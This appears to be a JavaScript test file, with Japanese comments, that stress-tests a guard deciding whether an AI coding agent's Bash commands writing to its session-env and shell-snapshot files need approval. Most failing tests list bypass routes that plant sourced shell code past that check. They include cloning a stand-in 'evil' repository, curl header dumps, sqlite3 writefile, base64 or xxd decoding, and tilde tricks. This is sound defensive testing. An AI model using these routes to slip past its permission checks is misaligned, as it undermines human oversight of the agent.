// #1270: 環境のファイル（session-env、shell-snapshots、CLAUDE_ENV_FILE）への書き込みの判定を崩しにいく 3 周目のテスト。
// 保存済みのテスト（shell-env、session-env）、more、more-2、more-3、break-1、break-2 に無い手口だけを置く。
// [欠陥] の付いたテストは、今の実装で落ちる形。横のコメントに、書き込みが実際に起きること（一時の HOME で bash と zsh を動かして確かめた）と
// 欠陥とみなす根拠を書く。根拠の多くは Issue の「期待する動き」（session-env の下への Bash の書き込みは ask）と、
// docs/development.md の guard-bash.mjs の行の「見えない形」に挙がっていないこと
import assert from 'node:assert/strict';
import os from 'node:os';
import path from 'node:path';
import { describe, test } from 'node:test';
import { judgeBash } from './bash-rules.mjs';
import { SHELL_ENV_REASON } from './file-rules.mjs';

const verdict = (command, { cwd = '/repo', env = {} } = {}) => judgeBash(command, { cwd, branchOf: () => '1270-session-env', env });
const expectAsk = (command, options) => assert.deepEqual(verdict(command, options), ['ask', SHELL_ENV_REASON], command);
// git の別の規則が先に当たる形は、理由が別でも ask であればよい
const expectAskAny = (command, options) => assert.equal(verdict(command, options)?.[0], 'ask', command);
const expectAllow = (command, options) => assert.equal(verdict(command, options), null, command);

const worktree = path.resolve(import.meta.dirname, '../..');

describe('止めすぎない: 2 周目の直しの周りの日常の形', () => {
  for (const command of [
    'cd ~/work/proj && git apply /tmp/p',
    'git -C ~/work/proj apply /tmp/p',
    'patch -d ~/work/proj -p1 < /tmp/p',
    'cd ~ && cp work/a.txt work/b.txt',
    'cd ~ && rsync -a work/ backup/',
    'cd ~ && cp .claude/session-env/a/x.sh /tmp/',
    'cd ~ && find .claude/session-env -name "*.sh"',
    'cd ~/.claude/session-env/x && cp $PWD/a.sh /tmp/',
    'cd ~/.claude/session-env/x && cd /tmp && cp ~-/a.sh .',
    `sqlite3 x.db ".output /tmp/out.txt" "select 1"`,
    `curl -sS -o /tmp/x -w '%{http_code} %{time_total}\\n' https://example.com`,
    'curl -s -D /tmp/h.txt https://example.com',
    'xxd -ps ~/.claude/session-env/a/x.sh',
    'git clone https://github.com/o/r ~/work/r',
    `ruby -e 'puts File.read(ARGV[0])' ~/.claude/session-env/a/x.sh`,
  ]) {
    test(`[通す] ${command}`, () => expectAllow(command));
  }
  test('[通す] ワークツリーの中の git apply と patch', () => {
    expectAllow('git apply /tmp/p', { cwd: worktree });
    expectAllow('patch -p1 < /tmp/p', { cwd: worktree });
  });
});

describe('git が作業コピーとして書く先', () => {
  // clone と worktree add は、リポジトリの中身（コミットした任意の x.sh）を指した先に書き出す。--work-tree の reset --hard と、
  // --git-dir だけを付けた checkout-index -a（作業場所を作業コピーの根とする）も同じ。どれも bash と zsh で
  // session-env/<名前>/x.sh ができるのを確かめた（--work-tree の checkout -f は git の別の規則で ask になる）。2 周目は
  // checkout-index --prefix と git show --output= を ask にしたが、作業コピーとして書く形は表に無く、docs の「見えない形」にも挙がっていない
  for (const command of [
    'git clone /tmp/evil /root/.claude/session-env/x',
    'git clone https://example.com/evil.git ~/.claude/session-env/x',
    'gh repo clone o/evil ~/.claude/session-env/x',
    'git worktree add /root/.claude/session-env/x evil',
    'git --git-dir=/tmp/g/.git --work-tree=/root/.claude/session-env/x reset --hard',
    'cd ~/.claude/session-env/x && git --git-dir=/tmp/g/.git checkout-index -a',
  ]) {
    test(`[欠陥] ${command}`, () => expectAskAny(command));
  }
});

describe('curl と sqlite3 の別の書き先', () => {
  // -D（--dump-header）はサーバーが返したヘッダーを、--trace-ascii は要求の URL を含むやりとりを書く（file:// で書かれるのを
  // bash と zsh で確かめた）。ヘッダーの値は相手のサーバーが決め（X: ;export A=1 の行は ; の後ろが動く）、--trace-ascii の行には
  // 書いた URL がそのまま載る。docs は curl の -o、--stderr、%output{} を見るとしており、同じ道具の別の書き先
  for (const command of [
    'curl -s -D ~/.claude/session-env/a/x.sh https://example.com',
    'curl -s --dump-header ~/.claude/session-env/a/x.sh https://example.com',
    'curl -s --trace-ascii ~/.claude/session-env/a/x.sh https://example.com',
  ]) {
    test(`[欠陥] ${command}`, () => expectAsk(command));
  }
  // curl -K - は標準入力を設定として読み、output = の先に書く（bash と zsh で確かめた）。source /dev/stdin と awk -f /dev/stdin の
  // ヒアストリングは 2 周目の直しで ask になった。同じく本文が字面にある
  test(`[欠陥] curl -K - <<< 'output = "…/session-env/a/x.sh"'`, () =>
    expectAsk(`curl -s -K - <<< 'output = "/root/.claude/session-env/a/x.sh"\nurl = "https://example.com"'`));
  // sqlite3 の CLI は writefile() を組み込みで持ち、任意の文字列を任意のファイルに書く。.output は一意な前方一致の省略（.out、.o）
  // でも効く。パイプで渡した .output も同じ（どれも bash と zsh で session-env/a/x.sh ができるのを確かめた）。docs の「見えない形」は
  // .shell と .system だけで、.output と .once は見るとしている
  for (const command of [
    `sqlite3 :memory: "select writefile('/root/.claude/session-env/a/x.sh', 'export A=1');"`,
    `sqlite3 :memory: '.out /root/.claude/session-env/a/x.sh' "select 'export A=1';"`,
    `sqlite3 :memory: '.o /root/.claude/session-env/a/x.sh' "select 'export A=1';"`,
    `printf '.output /root/.claude/session-env/a/x.sh\\nselect 1;' | sqlite3`,
  ]) {
    test(`[欠陥] ${command}`, () => expectAsk(command));
  }
});

describe('表に無い -o の道具と、2 周目の数え方の取りこぼし', () => {
  // macOS の base64 -o、uudecode -o、sdiff -o は指した先に書く（どれも bash と zsh で session-env/a/x.sh ができるのを確かめた）。
  // Issue の「セッションが置いた前提」は表に無い書き込みの道具を ask にする方針で、docs の「見えない形」は「2 つ目の引数に書く道具」
  // だけ。-o で先を名指す形は sort -o、openssl -out と同じ
  for (const command of [
    'base64 -d -o ~/.claude/session-env/a/x.sh <<< ZXhwb3J0IEE9MQo=',
    'uudecode -o ~/.claude/session-env/a/x.sh /tmp/x.uu',
    'sdiff -o ~/.claude/session-env/a/x.sh /tmp/a /tmp/b',
  ]) {
    test(`[欠陥] ${command}`, () => expectAsk(command));
  }
  // xxd の -ps は -p（-postscript、-plain）の別の綴りで、16 進を戻す定番の形。-p と s（値を取る）に分けて入力を値とみなし、
  // 2 つ目の位置引数を取りこぼす（bash と zsh で書かれるのを確かめた）。xxd -r -p は ask になる
  test('[欠陥] xxd -r -ps /tmp/x.hex ~/.claude/session-env/a/x.sh', () => expectAsk('xxd -r -ps /tmp/x.hex ~/.claude/session-env/a/x.sh'));
  // ruby の -0 は 8 進の数字を続けて取り、その後ろに短いフラグを続けられる（-0777pi で書き換わるのを確かめた）。-0 で数え終えて i を見落とす
  test(`[欠陥] ruby -0777pi -e 'x' ~/.claude/session-env/a/x.sh`, () => expectAsk(`ruby -0777pi -e 'x' ~/.claude/session-env/a/x.sh`));
  // ruby -C は作業場所を移してから本文を動かす（File.write("x.sh") が session-env/a/x.sh を書くのを確かめた）。docs は env -C の後の
  // 相対パスを見るとしている
  test(`[欠陥] ruby -C ~/.claude/session-env/a -e 'File.write("x.sh","x")'`, () =>
    expectAsk(`ruby -C ~/.claude/session-env/a -e 'File.write("x.sh","export A=1")'`));
  // GNU patch の --prefix= は -B の長い綴りで、控えをその接頭辞の下に書く（patch 2.8 で session-env/a/p.sh ができるのを確かめた）。
  // -B と、空白で区切った --prefix は ask になる
  test('[欠陥] patch -b --prefix=/root/.claude/session-env/a/ -p0 < /tmp/p', () =>
    expectAsk('patch -b --prefix=/root/.claude/session-env/a/ -p0 < /tmp/p'));
});

describe('ホームと作業場所の別の綴り', () => {
  // ~+ は $PWD と同じ（break-2 で > ~+/a.sh は ask になった）。cp の先と tee の先では見落とす（bash と zsh で書かれるのを確かめた）
  for (const command of ['cd ~/.claude/session-env/x && cp /tmp/a.sh ~+/a.sh', 'cd ~/.claude/session-env/x && tee ~+/a.sh < /tmp/a']) {
    test(`[欠陥] ${command}`, () => expectAsk(command));
  }
  // ditto は -r を付けなくても常にディレクトリを再帰でコピーし、元の中身を先に置く（ditto h ~ で ~/.claude/session-env/a/x.sh が
  // できるのを bash と zsh で確かめた）。docs はホームへの再帰コピーを止めるとし、cp -r h/. ~ は ask になる
  test('[欠陥] ditto /tmp/h ~', () => expectAskAny('ditto /tmp/h ~'));
  // ~ユーザー名 は、そのユーザーのホームに展開される（bash と zsh）。~ と $HOME とホームの絶対パスへの再帰コピーと展開は ask になる
  const user = os.userInfo().username;
  for (const command of [`cp -r /tmp/h/. ~${user}`, `cd ~${user} && tar xf /tmp/a.tar`]) {
    test(`[欠陥] ${command}`, () => expectAskAny(command));
  }
  // ホームの親への展開は、メンバー（Users/<名前>/.claude/session-env/a/x.sh）を ../ なしでホームの下に置く。docs の
  // 「見えない形」はメンバーの ../ だけで、展開先がホームなら止めるとしている
  test('[欠陥] tar xf /tmp/a.tar -C <ホームの親>', () => expectAskAny(`tar xf /tmp/a.tar -C ${path.dirname(os.homedir())}`));
});
